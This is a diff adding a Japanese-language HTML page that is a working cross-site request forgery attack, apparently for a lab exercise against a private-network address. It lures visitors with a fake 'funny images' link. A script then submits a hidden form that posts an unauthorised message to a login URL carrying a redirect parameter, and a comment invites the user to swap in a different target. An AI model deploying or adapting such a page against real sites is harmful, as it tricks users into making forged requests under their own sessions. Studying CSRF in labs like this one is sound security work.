@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Document</title>
+</head>
+
+<body>
+  <h1>怪しくないサイト</h1>
+
+  <a href="kansen.html" id="link" target="_blank">超面白い画像はこちら！このボタンを押してみてね→</a>
+
+  <form action="#" method="post" name="trap" style="display: none;">
+    <input type="hidden" name="body" value="不正に書き込みしたよ" />
+  </form>
+
+  <script>
+    const targetURL = 'http://192.168.1.113/login/?redirect=%2F%2Fgoogle.com'; //リンクを変えてください
+    const link = document.getElementById('link');
+
+    link.addEventListener('click', function (e) {
+      document.forms.trap.action = targetURL;
+      document.forms.trap.submit();
+    });
+
+
+  </script>
+</body>
+
+</html>
